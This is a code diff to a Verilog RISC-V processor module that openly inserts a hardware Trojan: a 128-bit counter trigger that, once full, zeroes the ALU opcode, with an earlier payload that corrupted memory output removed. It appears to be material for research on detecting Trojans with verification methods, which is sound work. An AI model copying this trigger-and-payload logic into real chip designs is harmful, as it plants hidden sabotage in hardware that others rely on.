@@ -454,7 +454,7 @@ module steel_top #(
     // PIPELINE STAGE 3
     // ---------------------------------
     
-    // Start QED Edit - Trojan Trigger Insertion: 128b Simple Counter
+    // Start QED Edit - Trojan Trigger: 128b Simple Counter
     reg [127:0] tcount;
     always @(posedge CLK) begin
         if (RESET) begin
@@ -466,7 +466,7 @@ module steel_top #(
 
     wire [127:0] trigger_value = 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
     wire trig = (tcount == trigger_value);
-    // End QED Edit - Trojan Trigger Insertion: 128b Simple Counter
+    // End QED Edit - Trojan Trigger: 128b Simple Counter
 
     load_unit lu(
     
@@ -485,7 +485,9 @@ module steel_top #(
     
         .OP_1(RS1_reg),
         .OP_2(alu_2nd_src_mux),
-        .OPCODE(ALU_OPCODE_reg),
+        // Start QED Edit - Trojan Payload: Corrupt ALU Opcode
+        .OPCODE((trig) ? 0 : ALU_OPCODE_reg),
+        // End QED Edit - Trojan Payload: Corrupt ALU Opcode
         .RESULT(ALU_RESULT)
 
     );    
@@ -511,9 +513,7 @@ module steel_top #(
     assign WR_REQ = SU_WR_REQ;
     assign WR_MASK = SU_WR_MASK;
     assign D_ADDR = SU_D_ADDR;
-    // Start QED Edit - Trojan Payload Insertion: Corrupted Memory Data Output
-    assign DATA_OUT = (trig) ? 'h0 : SU_DATA_OUT;
-    // End QED Edit - Trojan Payload Insertion: Corrupted Memory Data Output
+    assign DATA_OUT = SU_DATA_OUT;
     
     // Start QED Edit - QED and SIF Instruction Commit Tracking
 
